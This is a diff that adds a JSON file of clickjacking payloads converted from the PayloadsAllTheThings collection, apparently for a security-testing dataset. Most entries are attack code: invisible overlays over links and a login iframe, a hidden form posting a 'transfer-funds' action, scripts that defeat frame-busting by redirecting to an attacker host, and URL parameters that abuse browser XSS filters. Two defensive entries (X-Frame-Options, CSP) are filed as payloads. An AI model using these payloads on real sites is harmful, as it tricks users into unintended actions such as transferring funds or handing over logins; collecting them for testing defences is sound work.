@@ -1,0 +1,105 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "clickjacking",
+  "original_category": "Clickjacking",
+  "payloads": [
+    {
+      "category": "UI Redressing",
+      "escalation": "baseline",
+      "lines": [
+        "<div style=\"opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;\">",
+        "<a href=\"malicious-link\">Click me</a>",
+        "</div>"
+      ]
+    },
+    {
+      "category": "Execution Methods",
+      "escalation": "baseline",
+      "lines": [
+        "<form action=\"malicious-site\" method=\"POST\" id=\"hidden-form\" style=\"display: none;\">",
+        "<input type=\"hidden\" name=\"username\" value=\"attacker\">",
+        "<input type=\"hidden\" name=\"action\" value=\"transfer-funds\">",
+        "</form>",
+        "function submitForm() {",
+        "document.getElementById('hidden-form').submit();",
+        "}"
+      ]
+    },
+    {
+      "category": "Implement X-Frame-Options Header",
+      "escalation": "baseline",
+      "lines": [
+        "Header always append X-Frame-Options SAMEORIGIN"
+      ]
+    },
+    {
+      "category": "Content Security Policy (CSP)",
+      "escalation": "baseline",
+      "lines": [
+        "<meta http-equiv=\"Content-Security-Policy\" content=\"frame-ancestors 'self';\">"
+      ]
+    },
+    {
+      "category": "OnBeforeUnload Event",
+      "escalation": "baseline",
+      "lines": [
+        "<h1>www.fictitious.site</h1>",
+        "<script>",
+        "window.onbeforeunload = function()",
+        "{",
+        "return \" Do you want to leave fictitious.site?\";",
+        "}",
+        "</script>",
+        "<iframe src=\"http://target site\">",
+        "<?php",
+        "header(\"HTTP/1.1 204 No Content\");",
+        "?>",
+        "<script>",
+        "var prevent_bust = 0;",
+        "window.onbeforeunload = function() {",
+        "prevent_bust++;",
+        "};",
+        "setInterval(",
+        "function() {",
+        "if (prevent_bust > 0) {",
+        "prevent_bust -= 2;",
+        "window.top.location = \"http://attacker.site/204.php\";",
+        "}",
+        "}, 1);",
+        "</script>",
+        "<iframe src=\"http://target site\">"
+      ]
+    },
+    {
+      "category": "IE8 XSS filter",
+      "escalation": "baseline",
+      "lines": [
+        "<script>",
+        "if ( top != self )",
+        "{",
+        "top.location=self.location;",
+        "}",
+        "</script>",
+        "<iframe src=”http://target site/?param=<script>if”>"
+      ]
+    },
+    {
+      "category": "Chrome 4.0 XSSAuditor filter",
+      "escalation": "baseline",
+      "lines": [
+        "<iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>"
+      ]
+    },
+    {
+      "category": "Challenge",
+      "escalation": "baseline",
+      "lines": [
+        "<div style=\"position: absolute; opacity: 0;\">",
+        "<iframe src=\"https://legitimate-site.com/login\" width=\"500\" height=\"500\"></iframe>",
+        "</div>",
+        "<button onclick=\"document.getElementsByTagName('iframe')[0].contentWindow.location='malicious-site.com';\">Click me</button>"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.868Z"
+}
